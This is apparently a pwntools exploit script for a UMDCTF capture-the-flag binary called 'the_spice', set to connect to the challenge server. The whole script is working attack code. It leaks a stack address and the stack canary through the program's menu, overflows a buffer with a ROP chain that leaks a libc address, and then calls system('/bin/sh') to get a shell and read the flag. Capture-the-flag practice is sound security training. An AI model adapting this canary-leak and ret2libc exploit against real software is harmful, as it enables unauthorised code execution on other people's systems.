#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './the_spice'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = 'challs.umdctf.io', 31721

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
# break *0x4013c7
# break *0x4016fa
break *0x04017ff
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# └──╼ [★]$ pwn checksec the_spice
#     Arch:     amd64-64-little
#     RELRO:    Full RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      No PIE (0x3ff000)
#     RUNPATH:  b'.'


def exploit():
    global io
    io = initialize()

    io.sendlineafter(b'>', b'4')
    io.recvuntil(b'saw: 0x')
    stack = int(io.recvline().strip(), 16)

    io.sendlineafter(b'>', b'3')
    io.sendlineafter(b':', b'9')
    io.recvuntil(b'9: ')
    canary = hex(u32(io.recv(4)))

    io.recvuntil(b'allocated ')
    canary += hex(int(io.recvuntil(b' ', drop=True)))[2:]
    canary = int(canary, 16)

    payload = b'A' * (188 + 24)
    payload += flat([
        canary,
        0x0,
        elf.plt['puts'],
        elf.sym['main']
    ])

    io.sendlineafter(b'>', b'1')
    io.sendlineafter(b':', b'0')
    io.sendlineafter(b'?', str(0x1000).encode())
    io.sendlineafter(b':', payload)

    io.sendlineafter(b'>', b'5')

    io.recvline()
    libc.address = u64(io.recvline().strip().ljust(8, b'\x00')) - 0x62050

    payload = b'A' * (188 + 24)
    payload += flat([
        canary,
        0x0,
        libc.address +0x2a3e5, # pop rdi; ret;
        next(libc.search(b'/bin/sh\x00')),
        0x40101a, # ret
        libc.sym['system']
    ])

    io.sendlineafter(b'>', b'1')
    io.sendlineafter(b':', b'0')
    io.sendlineafter(b'?', str(0x1000).encode())
    io.sendlineafter(b':', payload)

    io.sendlineafter(b'>', b'5')

    io.sendline(b'cat flag*')

    log.success('canary: %#x', canary)
    log.success('libc base: %#x', libc.address)

    io.interactive()
    
if __name__ == '__main__':
    exploit()